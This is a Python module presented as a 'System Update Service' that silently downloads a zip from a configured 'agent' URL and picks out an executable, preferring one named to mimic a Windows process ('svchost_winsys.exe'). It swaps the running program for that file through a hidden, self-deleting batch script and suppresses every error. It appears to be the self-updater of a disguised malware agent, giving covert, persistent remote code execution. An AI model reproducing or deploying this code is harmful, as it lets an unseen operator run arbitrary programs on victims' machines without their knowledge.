# updater_svc.py - System Update Service
import os
import sys
import time
import shutil
import tempfile
import subprocess
import requests
import zipfile
import json
from datetime import datetime
import sys_config as config

class SystemUpdater:
    def __init__(self):
        self.version_actual = config.VERSION_ACTUAL
        self.url_version = config.URL_VERSION
        self.url_agente = config.URL_AGENTE
        self.install_path = config.INSTALL_PATH
        self.ultima_verificacion = 0
        
    def verificar_actualizacion(self):
        try:
            response = requests.get(self.url_version, timeout=5)
            if response.status_code == 200:
                nueva_version = response.text.strip()
                if nueva_version and nueva_version != self.version_actual:
                    return True, nueva_version
            return False, self.version_actual
        except:
            return False, self.version_actual
    
    def descargar_actualizacion(self):
        try:
            temp_dir = tempfile.mkdtemp()
            zip_path = os.path.join(temp_dir, "system_update.zip")
            response = requests.get(self.url_agente, stream=True, timeout=30)
            if response.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                if os.path.getsize(zip_path) > 1000000:
                    return zip_path
            return None
        except:
            return None
    
    def instalar_actualizacion(self, zip_path):
        try:
            extract_dir = tempfile.mkdtemp()
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            nuevo_exe = None
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    if file.lower() == "svchost_winsys.exe" or file.endswith(".exe"):
                        nuevo_exe = os.path.join(root, file)
                        break
                if nuevo_exe:
                    break
            if not nuevo_exe:
                return False
            
            exe_actual = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            batch_content = f"""@echo off
timeout /t 3 /nobreak >nul
copy /Y "{nuevo_exe}" "{exe_actual}"
if exist "{exe_actual}" ( start "" "{exe_actual}" )
rmdir /s /q "{os.path.dirname(nuevo_exe)}" 2>nul
del "%~f0" 2>nul
"""
            batch_path = os.path.join(tempfile.gettempdir(), "sys_update.bat")
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            subprocess.Popen([batch_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return True
        except:
            return False
    
    def ciclo_actualizacion(self):
        while True:
            try:
                if time.time() - self.ultima_verificacion >= config.VERIFICAR_ACTUALIZACION_INTERVALO:
                    hay_actualizacion, nueva_version = self.verificar_actualizacion()
                    if hay_actualizacion:
                        zip_path = self.descargar_actualizacion()
                        if zip_path:
                            self.instalar_actualizacion(zip_path)
                    self.ultima_verificacion = time.time()
                time.sleep(60)
            except:
                time.sleep(300)